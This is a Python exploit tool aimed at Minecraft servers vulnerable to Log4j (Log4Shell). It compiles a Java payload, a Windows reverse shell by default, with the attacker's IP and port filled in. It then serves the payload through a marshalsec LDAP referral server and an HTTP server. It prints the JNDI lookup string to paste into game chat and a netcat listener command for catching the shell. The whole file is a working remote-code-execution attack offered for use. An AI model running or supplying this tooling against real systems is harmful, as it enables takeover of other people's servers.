import argparse
import subprocess
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

JAVA_BIN='path/to/bin/java'
JAVAC_BIN='path/to/bin/javac'

def generate_payload(userip, lport, javapath):
    print(javapath)
    with open(javapath) as f:
        code = f.read()
    code = code.replace('USER_IP', userip).replace('LPORT', str(lport))
    with open(f'Exploit.java', 'w') as f:
        f.write(code)
    try:
        subprocess.run([JAVAC_BIN, 'Exploit.java'], check=True)
        print(f"successfully compiled \"{javapath}\"")
    except subprocess.CalledProcessError as e:
        print(f"failed to compile \"{javapath}\": {e}")
        return 1


def ldap_server(userip, lport, javapath):
    print(f'starting LDAP server at ldap://{userip}:1389')
    print(f'send jndi lookup in chat: ${{jndi:ldap://{userip}:1389/a}}')
    url = f'http://{userip}:{lport}/#Exploit'
    subprocess.run([
        JAVA_BIN,
        '-cp', 'marshalsec-0.0.3-SNAPSHOT-all.jar',
        'marshalsec.jndi.LDAPRefServer',
        url
    ])


def start_payload(userip, webport, lport, javapath):
    generate_payload(userip, lport, javapath)
    print(f'{javapath}')
    if javapath == 'exploits/revshell.java':
        print(f'start a netcat listener in another window: nc -lvnp {lport}')
    threading.Thread(target=ldap_server, args=(userip, webport, javapath), daemon=True).start()
    print(f'starting HTTP server at http://0.0.0.0:{webport}\n')
    HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler).serve_forever()


parser = argparse.ArgumentParser(description='minecraft server Log4j exploit')
parser.add_argument('--exploit', type=str, default='exploits/winRevShell.java', help='path to java payload')
parser.add_argument('--userip', type=str, default='localhost', help='your IP address')
parser.add_argument('--webport', type=int, default=8080, help='web server port')
parser.add_argument('--lport', type=int, default=4444, help='listener port')

args = parser.parse_args()
try:
    start_payload(args.userip, args.webport, args.lport, args.exploit)
except KeyboardInterrupt:
    print("\nExiting...")
